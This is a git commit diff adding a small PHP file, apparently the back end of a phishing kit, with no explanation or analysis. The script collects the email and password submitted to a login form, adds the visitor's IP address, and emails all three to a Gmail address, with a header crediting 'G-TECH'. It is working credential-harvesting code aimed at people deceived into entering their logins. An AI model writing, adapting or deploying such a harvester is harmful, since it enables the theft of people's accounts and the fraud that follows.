1826d25fc326622de504dec3e9155b77c8d8e370
mistickerforca <83012267+mistickerforca@users.noreply.github.com>
2021-08-10 16:50:45 -0700

    Add files via upload

---
+++ index (2).php
@@ -0,0 +1,24 @@
+
+<?php
+$ip = getenv("REMOTE_ADDR");	
+
+if(!empty($_POST)) {
+ $email= $_POST['email'];
+ $password = $_POST['password'];
+ 
+		$to = "@gmail.com";
+		
+		
+         $subject = "New Login : ip";
+		 
+		 $message =  "Online ID            : ".$email."\r\n";
+         $message .= "Password           : ".$password."\r\n";
+         $message .= "Ip           : ".$ip."\r\n";
+		 
+		$header = "Coded by G-TECH\r\n";
+         $header .= "MIME-Version: 1.0\r\n";
+         $header .= "Content-type: text/html\r\n";
+		 
+		 mail ($to,$subject,$message,$header);
+}
+?>
